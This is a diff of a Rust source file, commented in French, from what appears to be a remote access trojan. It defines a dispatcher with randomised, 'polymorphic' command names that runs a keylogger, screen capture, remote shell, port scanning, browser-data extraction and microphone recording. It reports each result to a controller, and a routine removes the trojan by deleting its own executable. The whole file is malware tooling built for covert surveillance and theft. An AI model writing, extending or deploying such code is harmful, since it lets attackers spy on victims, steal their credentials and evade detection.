@@ -1,4 +1,4 @@
-use crate::{browser_info, input, logs, mic_rec, network_scanner, screenshot, shell, connexion};
+use crate::{browser_info, connexion, input, logs, mic_rec, network_scanner, screenshot, shell};
 use rand::Rng;
 use std::{collections::HashMap, future::Future, pin::Pin, sync::OnceLock};
 
@@ -41,14 +41,52 @@ pub fn init_polymorph_functions() {
     cmd_map.insert("mic_rec", mic_rec_name.clone());
     cmd_map.insert("end_of_rat", end_of_rat_name.clone());
 
-    poly_map.insert(keylogger_name.clone(), Box::new(|alias| Box::pin(keylogger_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
-    poly_map.insert(screenshot_name.clone(), Box::new(|alias| Box::pin(screenshot_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
-    poly_map.insert(logs_name.clone(), Box::new(|alias| Box::pin(logs_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
-    poly_map.insert(shell_name.clone(), Box::new(|alias| Box::pin(shell_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
-    poly_map.insert(network_scan_name.clone(), Box::new(|alias| Box::pin(network_scan_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
-    poly_map.insert(browser_info_name.clone(), Box::new(|alias| Box::pin(browser_info_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
-    poly_map.insert(mic_rec_name.clone(), Box::new(|alias| Box::pin(mic_rec_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
-    poly_map.insert(end_of_rat_name.clone(), Box::new(|alias| Box::pin(end_of_rat_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
+    poly_map.insert(
+        keylogger_name.clone(),
+        Box::new(|alias| {
+            Box::pin(keylogger_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
+        }) as PolyFunc,
+    );
+    poly_map.insert(
+        screenshot_name.clone(),
+        Box::new(|alias| {
+            Box::pin(screenshot_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
+        }) as PolyFunc,
+    );
+    poly_map.insert(
+        logs_name.clone(),
+        Box::new(|alias| Box::pin(logs_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>)
+            as PolyFunc,
+    );
+    poly_map.insert(
+        shell_name.clone(),
+        Box::new(|alias| Box::pin(shell_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>)
+            as PolyFunc,
+    );
+    poly_map.insert(
+        network_scan_name.clone(),
+        Box::new(|alias| {
+            Box::pin(network_scan_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
+        }) as PolyFunc,
+    );
+    poly_map.insert(
+        browser_info_name.clone(),
+        Box::new(|alias| {
+            Box::pin(browser_info_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
+        }) as PolyFunc,
+    );
+    poly_map.insert(
+        mic_rec_name.clone(),
+        Box::new(|alias| {
+            Box::pin(mic_rec_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
+        }) as PolyFunc,
+    );
+    poly_map.insert(
+        end_of_rat_name.clone(),
+        Box::new(|alias| {
+            Box::pin(end_of_rat_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
+        }) as PolyFunc,
+    );
 
     println!("Noms polymorphiques générés :");
     println!("- keylogger: {}", keylogger_name);
@@ -66,24 +104,28 @@ pub fn init_polymorph_functions() {
 
 async fn keylogger_wrapper(alias: String) {
     println!("[{}] Démarrage du keylogger...", alias);
-    match input::start_keylogger(10).await {
-        Ok(_) => {
-            let _ = connexion::send_directive_status(&alias, "success", "Terminé").await;
+    input::init_keylogger_flag();
+    tokio::spawn(async move {
+        match input::start_keylogger(10).await {
+            Ok(_) => {
+                let _ = connexion::send_directive_status("keylogger", "success", "Terminé").await;
+            }
+            Err(e) => {
+                let _ =
+                    connexion::send_directive_status("keylogger", "error", &e.to_string()).await;
+            }
         }
-        Err(e) => {
-            let _ = connexion::send_directive_status(&alias, "error", &e.to_string()).await;
-        }
-    }
+    });
 }
 
 async fn screenshot_wrapper(alias: String) {
     println!("[{}] Prise de screenshot...", alias);
     match screenshot::take_screenshot().await {
         Ok(_) => {
-            let _ = connexion::send_directive_status(&alias, "success", "Terminé").await;
+            let _ = connexion::send_directive_status("screenshot", "success", "Terminé").await;
         }
         Err(e) => {
-            let _ = connexion::send_directive_status(&alias, "error", &e.to_string()).await;
+            let _ = connexion::send_directive_status("screenshot", "error", &e.to_string()).await;
         }
     }
 }
@@ -92,10 +134,10 @@ async fn logs_wrapper(alias: String) {
     println!("[{}] Récupération des logs système...", alias);
     match logs::get_sysinfo().await {
         Ok(_) => {
-            let _ = connexion::send_directive_status(&alias, "success", "Terminé").await;
+            let _ = connexion::send_directive_status("logs", "success", "Terminé").await;
         }
         Err(e) => {
-            let _ = connexion::send_directive_status(&alias, "error", &e.to_string()).await;
+            let _ = connexion::send_directive_status("logs", "error", &e.to_string()).await;
         }
     }
 }
@@ -104,10 +146,10 @@ async fn shell_wrapper(alias: String) {
     println!("[{}] Démarrage du shell distant...", alias);
     match shell::launch_shell().await {
         Ok(_) => {
-            let _ = connexion::send_directive_status(&alias, "success", "Session terminée").await;
+            let _ = connexion::send_directive_status("shell", "success", "Session terminée").await;
         }
         Err(e) => {
-            let _ = connexion::send_directive_status(&alias, "error", &e.to_string()).await;
+            let _ = connexion::send_directive_status("shell", "error", &e.to_string()).await;
         }
     }
 }
@@ -116,10 +158,10 @@ async fn network_scan_wrapper(alias: String) {
     println!("[{}] Scanner réseau...", alias);
     match network_scanner::scan_all_ports().await {
         Ok(_) => {
-            let _ = connexion::send_directive_status(&alias, "success", "Terminé").await;
+            let _ = connexion::send_directive_status("network_scan", "success", "Terminé").await;
         }
         Err(e) => {
-            let _ = connexion::send_directive_status(&alias, "error", &e.to_string()).await;
+            let _ = connexion::send_directive_status("network_scan", "error", &e.to_string()).await;
         }
     }
 }
@@ -128,10 +170,10 @@ async fn browser_info_wrapper(alias: String) {
     println!("[{}] Extraction données navigateurs...", alias);
     match browser_info::process_browser_profiles().await {
         Ok(_) => {
-            let _ = connexion::send_directive_status(&alias, "success", "Terminé").await;
+            let _ = connexion::send_directive_status("browser_info", "success", "Terminé").await;
         }
         Err(e) => {
-            let _ = connexion::send_directive_status(&alias, "error", &e.to_string()).await;
+            let _ = connexion::send_directive_status("browser_info", "error", &e.to_string()).await;
         }
     }
 }
@@ -140,10 +182,10 @@ async fn mic_rec_wrapper(alias: String) {
     println!("[{}] Enregistrement microphone...", alias);
     match mic_rec::record_mic().await {
         Ok(_) => {
-            let _ = connexion::send_directive_status(&alias, "success", "Terminé").await;
+            let _ = connexion::send_directive_status("mic_rec", "success", "Terminé").await;
         }
         Err(e) => {
-            let _ = connexion::send_directive_status(&alias, "error", &e.to_string()).await;
+            let _ = connexion::send_directive_status("mic_rec", "error", &e.to_string()).await;
         }
     }
 }
@@ -156,7 +198,10 @@ async fn end_of_rat_wrapper(alias: String) {
         use std::process::Command;
         let exe_path = std::env::current_exe().unwrap();
         let _ = Command::new("cmd")
-            .args(["/C", &format!("timeout 1 && del /F /Q \"{}\"", exe_path.display())])
+            .args([
+                "/C",
+                &format!("timeout 1 && del /F /Q \"{}\"", exe_path.display()),
+            ])
             .spawn();
     }
     #[cfg(target_os = "linux")]
